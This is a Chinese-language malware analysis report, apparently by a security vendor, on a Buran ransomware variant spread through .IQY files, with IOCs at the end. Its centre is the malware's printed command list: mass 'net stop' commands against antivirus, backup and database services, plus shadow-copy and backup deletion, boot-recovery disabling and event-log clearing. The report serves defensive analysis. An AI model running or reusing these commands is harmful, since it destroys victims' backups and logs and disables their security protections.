## 概述

日前勒索病毒猖獗，勒索病毒种类层出不穷，奇安信病毒响应中心在持续监测勒索病毒中发现了Buran勒索利用.IQY文件下发PayLoad的新变种。IQY文件允许从一个.ASP网页检索并导入到Microsoft
Excel中。此次捕获的样本就是利用IQY文件从服务器请求脚本数据从而下载并执行后续PayLoad。

## 样本分析

### IQY文档分析

IQY文本文件内容如下：![图片.png](https://image.3001.net/images/20191120/1574218318_5dd4aa4e2029d.png!small)

打开之后会从服务器获取的数据为脚本命令：

![图片.png](https://image.3001.net/images/20191120/1574218335_5dd4aa5fcc349.png!small)

负责从服务器请求1.exe释放到Temp目录并执行。

  

### PayLoad分析

从服务器下载的样本参考编译时间为2019年10月15号:
![图片.png](https://image.3001.net/images/20191120/1574218345_5dd4aa6904289.png!small)

  

进程启动之后会清空当前进程映射到的内存地址，随后将真正要执行的代码拷贝到主进程之前映射到的地址来重新执行OEP，Dump内存中的PE文件发现该PE为Delphi编写。

![图片.png](https://image.3001.net/images/20191120/1574218378_5dd4aa8a7abf5.png!small)

![图片.png](https://image.3001.net/images/20191120/1574218382_5dd4aa8ed38af.png!small)

### Delphi PayLoad分析：

参考编译时间为2019年11月13日。

启动之后程序会判断当前参数个数，根据不同参数个数执行不同流程。

![图片.png](https://image.3001.net/images/20191120/1574218397_5dd4aa9d44c53.png!small)

**不带参数分析：**

当不带参数启动之后会获取当前系统国家是否为Ukraine、Belorussia、Kazakhstan或者Russian
Federation，如果是其中一个则直接退出进程：

![图片.png](https://image.3001.net/images/20191120/1574218402_5dd4aaa28ac76.png!small)

随后会在当前路径下释放一个后缀为.zeppelin的文件并写入1个字节，内容为0x00的数据，然后调用DeleteFileW删除该文件，如果删除失败则调用ExitProcess退出进程，此举应该是测试当前进程是否能够读写删除文件，以便判断后续是否能够加密文件：

![图片.png](https://image.3001.net/images/20191120/1574218432_5dd4aac07f875.png!small)

尝试打开注册表，如果打开注册表失败随后还会创建并写入注册表：

![图片.png](https://image.3001.net/images/20191120/1574218454_5dd4aad65f322.png!small)

创建并写入注册表，注册表项为Software\Zeppelin：

![图片.png](https://image.3001.net/images/20191120/1574218462_5dd4aade1cde0.png!small)![图片.png](https://image.3001.net/images/20191120/1574218467_5dd4aae3a9b3c.png!small)

枚举进程信息：

![图片.png](https://image.3001.net/images/20191120/1574218473_5dd4aae932930.png!small)

将当前进程拷贝到C:\Users\cmm\AppData\Roaming\Microsoft\Windows\vmacthlp.exe，在拷贝之前尝试先删除vmacthlp.exe:

![图片.png](https://image.3001.net/images/20191120/1574218483_5dd4aaf36f07a.png!small)

通过注册表\Run设置开机启动：

![图片.png](https://image.3001.net/images/20191120/1574218488_5dd4aaf8c5891.png!small)

通过ShellExecute指定参数“-start”重新启动进程：

![图片.png](https://image.3001.net/images/20191120/1574218494_5dd4aafec56f7.png!small)

随后会检查Offset_373C地址的值如果不为空，并检查参数中是否带有“-start”，如果条件都不成立则会创建一个进程，通过创建远程线程执行写入的一段ShellCode来删除文件：

![图片.png](https://image.3001.net/images/20191120/1574218502_5dd4ab0626e53.png!small)

ShellCode代码为删除自身文件并退出进程：

![图片.png](https://image.3001.net/images/20191120/1574218510_5dd4ab0e6fe0a.png!small)

**带参数“-start”部分分析：**

带参启动之后实际动作会在offset_D074的位置检查是否有参数“-start”，如果由上面的创建进程执行ShellCode改为如下动作：

将生成的密钥经Base64编码之后保存到注册表：

![图片.png](https://image.3001.net/images/20191120/1574218521_5dd4ab191957d.png!small)![图片.png](https://image.3001.net/images/20191120/1574218526_5dd4ab1e557ab.png!small)

查询“knock”注册表的数据：

![图片.png](https://image.3001.net/images/20191120/1574218533_5dd4ab25ed70a.png!small)

如果查不到数据或者查到的数据不等于666则会解密出一个URL：

![图片.png](https://image.3001.net/images/20191120/1574218541_5dd4ab2d1f0fe.png!small)

将木马版本以及用户ID拼接到Http头中发送到服务器中：

![图片.png](https://image.3001.net/images/20191120/1574218547_5dd4ab330e564.png!small)

如果服务器有响应还会从服务器读取数据：

![图片.png](https://image.3001.net/images/20191120/1574218552_5dd4ab38edba4.png!small)

通信完成之后创建“Knock”并写入数值0x29A：

![图片.png](https://image.3001.net/images/20191120/1574218557_5dd4ab3de8cba.png!small)

循环获取网络资源数据：

![图片.png](https://image.3001.net/images/20191120/1574218563_5dd4ab4322ada.png!small)

从Z盘开始递减循环调用GetDriverType获取磁盘信息：

![图片.png](https://image.3001.net/images/20191120/1574218568_5dd4ab48d92d8.png!small)

调用CreateProcess带参“-agent 0”重新启动该进程：

![图片.png](https://image.3001.net/images/20191120/1574218574_5dd4ab4e40a85.png!small)

随后会对该进程进行提权，提到SeDebugPrivilege权限：

![图片.png](https://image.3001.net/images/20191120/1574218580_5dd4ab5401031.png!small)

循环创建CMD进程指定参数，具体参数如下图：

![图片.png](https://image.3001.net/images/20191120/1574218586_5dd4ab5a48cba.png!small)

![图片.png](https://image.3001.net/images/20191120/1574218590_5dd4ab5ed44ca.png!small)

命令列表如下：

net stop "Acronis VSS Provider" /y  
---  
net stop "Enterprise Client Service"/y  
net stop "SQL Backups"/y  
net stop "SQLsafe Backup Service" /y  
net stop "SQLsafe Filter Service" /y  
net stop "SophosAgent" /y  
net stop "Sophos AutoUpdate Service" /y  
net stop "Sophos Clean Service" /y  
net stop "Sophos Device Control Service" /y  
net stop "Sophos File Scanner Service" /y  
net stop "Sophos Health Service" /y  
net stop "SophosMCS Agent" /y  
net stop "Sophos MCS Client" /y  
net stop "Sophos Message Router" /y  
net stop "Sophos Safestore Service" /y  
net stop "Sophos SystemProtection Service" /y  
net stop "Sophos Web Control Service" /y  
net stop "Symantec System Recovery" /y  
net stop"Veeam Backup Catalog Data Service" /y  
net stop "Zoolz 2 Service" /y  
net stop ARSM /y  
net stop**P /y  
net stopAcrSch2Svc /y  
net stop AcronisAgent /y  
net stopAntivirus /y  
net stop BackupExecAgentAccelerator/y  
net stop BackupExecAgentBrowser /y  
net stop BackupExecDevice MediaService /y  
net stop BackupExecJobEngine /y  
net stop BackupE xecManagementService /y  
net stop BackupExecRPCService /y  
net stop BackupExecVSSProvider /y  
net stop DCAgent /y  
net stop EPSecurityService /y  
net stop EPUpdateService /y  
net stop ESHASRV /y  
net stop EhttpSrv /y  
net stop EraserSvc11710 /y  
net stop EsgShKernel /y  
net stop FA_Scheduler /y  
net stop IISAdmin/y  
net stop IMAP4Svc /y  
net stopK**FS /y  
net stop K**FSGT /y  
net stop MBAMServi ce /y  
net stop MBEndpointAgent /y  
net stop MMS /y  
net stop MSExchangeES /y  
net stop MSExchangeIS/y  
net stop MSExchangeMGMT /y  
net stop MSExchangeMTA /y  
net stop MSExchangeSA /y  
net stop MSExchangeSRS /y  
netstop MSOLAP$SQL_2008 /y  
net stop MSOLAP$SYSTEM_BGC /y  
net stop MSOLAP$TPS /y  
net stop MSOLAP$TPSAMA /y  
net stopMSSQL$BKUPEXEC /y  
net stop MSSQL$ECWDB2 /y  
net stop MSSQL$PRACTICEMGT /y  
net stop MSSQL$PRACTTICEBGC /y  
net stop MSSQL$PROD /y  
net stop MSSQL$PROFXENGAGEMENT /y  
net stop MSSQL$SBSMONITORING /y  
net stop MSSQL$SHAREPOINT /y  
net stop MSSQL$SOPHOS /y  
net stopMSSQL$SQLEXPRESS /y  
net stop MSSQL$SQL_2008 /y  
net stop MSSQL$SYSTEM_BGC /y  
netstop MSSQL$TPS /y  
net stop MSSQL$TPSAMA /y  
net stop MSSQL$VEEAMSQL2008R2 /y  
netstop MSSQL$VEEAMSQL2008R2 /y  
net stop MSSQL$VEEAMSQL2012 /y  
netstop MSSQLFDLauncher /y  
net stop MSSQLFDLauncher $PROFXENGAGEMENT /y  
net stop MSS QLFDLauncher$SBSMONITORING /y  
ne1 t stop MSSQLFDLauncher$SHAREPOIN T /y  
net stop MS SQLFDLauncher$SQL_2008 /y  
net stop MSSQLFDLauncher$SYSTEM_BGC /y  
net stop MSSQLFDLauncher$TPS /y  
net stop MSSQLFDLauncher$TPSAMA /y  
net stop MSSQLSERVER /y  
netstop MSSQLServerADHelper /y  
netstop MSSQLServerADHelper100 /y  
net stop MSSQLServerOLAPService /y  
net stop McAfeeEngineService /y  
net stop McAfe eFramework /y  
ne t stop McAfeeFraD meworkMcAfeeFramework /y  
net sto p McShield /y  
ne t stop McTaskManager /y  
net stop MsDtsServer /y  
net stop MsDtsServer100 /y  
net stop MsDtsServer110 /y  
net stop MySQL57 /y  
net stop MySQL80 /y  
net stop NetMsmqActivator /y  
net stop OracleClientCache80 /y  
net stop PDVFSService/y  
net stop POP3Svc /y  
net stop RESvc /y  
net stop ReportServer/y  
net stop ReportServer$SQL_2008 /y  
net stop ReportServer$SYSTEM_BGC /y  
net stop ReportServer$TPS /y  
net stop ReportServer$TPSAMA /y  
net stop S **AdminService /y  
net stop S**Service /y  
net stop SDRSVC /y  
net stop SMTPSvc /y  
net stop SNAC /y  
net stop SQLAgent$BKUPEXEC /y  
net stop SQLAgent $CITRIX_METAFRAME /y  
net stop SQLAgent$CXDB /y  
net stop SQLAgent$ECWDB2 /y  
net stop SQLAgent$PRACTTICEBGC /y  
net stop SQLAgent$P RACTTICEMGT /y  
net stop SQLAgent$PROD /y  
net stop SQLAgent$PROFXENGAGEMENT /y  
net stop SQLAgent$SBSMONITORING /y  
net stop SQLAgent$SHAREPOINT /y  
net stop SQLAgent$SOPHOS /y  
net stop SQLAgent$S QLEXPRESS /y  
net stop SQLAgent$SQL_2008 /y  
net stop SQLAgent$SYSTEM_BGC /y  
net stop SQLAgent$TPS /y  
net stop SQL Agent$TPSAMA /y  
net stop SQLAgen t$VEEAMSQL2008R2 /y  
net stop SQL Agent$VEEAMSQL2008R2 /y  
net stop SQLAgent$VEEAMSQL2012 /y  
net stop SQLBrowser /y  
net stop SQLSERVERAGENT /y  
net stop SQLSafeOLRService /y  
net stop SQLTELEMETRY/y  
net stop SQLT ELEMETRY$ECWDB2/y  
net stop SQLWriter /y  
net sto p SamSs /y  
net s top SepMasterService /y  
net stop ShMonitor /y  
ne t stop SmcService /y  
net stop Smcinst /y  
net stop SntpService /y  
net stop SstpSv c /y  
net stop TmCCSF /y  
net stop TrueKey /y  
net stop TrueKeyScheduler /y  
net sto p TrueKeyService Helper /y  
net stop UI0Detect /y  
net stop VeeamBackupSvc /y  
net stop VeeamBrokerS vc /y  
net stop V eeamCatalogSvc /y  
net stop VeeamCloudSvc /y  
net stop VeeamDeploySvc /y  
net stop VeeamDeploymentService /y  
net st op VeeamEnterpri seManagerSvc /y  
net stop VeeamHvIntegrationSvc /y  
net stop Veeam MountSvc /y  
net stop VeeamNFSSvc /y  
net stop Vee amRESTSvc /y  
net stop VeeamTransportSvc /y  
net stop W3Svc /y  
net stop WRSVC /y  
net stop bedbg /y  
net stop ekrn /y  
net stop kavfsslp /y  
net stopklnagent /y  
net stop macmnsvc /y  
net stop masvc /y  
net stop mfefire /y  
net stop mfemms /y  
net st op mfevtp /y  
net stop mozyprobackup /y  
net stop msftesql$PROD /y  
net stop ntrtscan /y  
net stop sacsvr /y  
net stop sophossps /y  
net stop svcGenericHost /y  
net stop swi_filter /y  
net stop swi_service /y  
net stop swi_update /y  
net stop swi_update_64 /y  
net stop tmlisten /y  
net stop wbengine /y  
net stop wbengine /y  
bcdedit /set {default}bootstatuspolicy ignoreallfailur es  
bcdedit /set {default} recoveryenabled no  
wba dmin delete cata log -quiet  
wbadm in delete system statebackup  
wbad min delete syste mstatebackup -ke epversions:  
wba dmin delete backup  
wmic shadowco py delete  
vssadm in delete shadow s /all /quiet  
re g delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server
Client\Default" /va /f  
reg delete"HKEY_CURRENT_USER\Software\Microsoft\TerminalServer Client\Servers"
/f  
reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"  
attrib "%userprofile%\documents\Default.rdp" -s -h  
del "%userprofile%\documents\Default.rdp"  
wevtutil.exe clear-log Application  
wevtutil.exe clear-log Security  
wevtutil.exe clear-log System  
sc configeventlog start=disabled  
  
等待创建的子进程结束完成：

![图片.png](https://image.3001.net/images/20191120/1574218610_5dd4ab72c5839.png!small)

线程结束之后则会枚举文件，将枚举到的文件数据保存在链表中，随后初始化种子：

生成种子的逻辑与旧版本相同，勒索方式为RAS+AES方式：

![图片.png](https://image.3001.net/images/20191120/1574218622_5dd4ab7ec96f7.png!small)

生成密钥也与旧版本相同：

![图片.png](https://image.3001.net/images/20191120/1574218628_5dd4ab847052c.png!small)

加密完数据之后，利用MoveFile替换原文件：

![图片.png](https://image.3001.net/images/20191120/1574218663_5dd4aba779c8b.png!small)

修改文件时间及属性：

![图片.png](https://image.3001.net/images/20191120/1574218668_5dd4abac72f95.png!small)

枚举之前加密的文件目录下是否有指定提示文件，如果没有则创建一个：

![图片.png](https://image.3001.net/images/20191120/1574218683_5dd4abbbcb17a.png!small)

写入勒索内容：

![图片.png](https://image.3001.net/images/20191120/1574218690_5dd4abc268d7b.png!small)

内容如下，用户ID发生了改变，联系邮箱也不同了：

![图片.png](https://image.3001.net/images/20191120/1574218699_5dd4abcb5414f.png!small)

勒索完成之后会清空之前保存的数据：

清空开机启动项：

![图片.png](https://image.3001.net/images/20191120/1574218706_5dd4abd23094a.png!small)

枚举并删除保存密钥的注册表：

![图片.png](https://image.3001.net/images/20191120/1574218711_5dd4abd77a2ce.png!small)

创建子进程，注入一段shellcode用来删除自身文件：

![图片.png](https://image.3001.net/images/20191120/1574218716_5dd4abdcb1bc0.png!small)

## 小结

奇安信病毒响应中心在日常监控中也发现Buran与其他勒索病毒存在部分代码重叠，勒索病毒代码复用率越来越高，部分病毒开始加强代码反分析的力度。

奇安信病毒响应中心提醒用户不要轻易打开未知邮件，提高安全意识，预防此类恶意样本攻击。

目前奇安信集团全线产品，包括天眼、SOC、态势感知、威胁情报平台，支持对涉及MYEC黑客团伙的攻击活动检测。奇安信天擎终端防护产品内置的EDR检测机制通过恶意代码的行为分析，支持对该组织此类非落地样本的检测和查杀。

## IOCs

MD5：

a1b5dc4fd2cd2b54498faf42fe9b5e50

8df3bf295bf6002bda1cead3d527403d

C&C:

hxxps://iplogger.org/1i8r57.jpg

参考链接：

<https://www.acronis.com/en-us/blog/posts/meet-buran-new-delphi-ransomware-delivered-rig-exploit-kit>

<https://www.mcafee.com/blogs/other-blogs/other-blogs/mcafee-labs/buran-ransomware-the-evolution-of-vegalocker/>

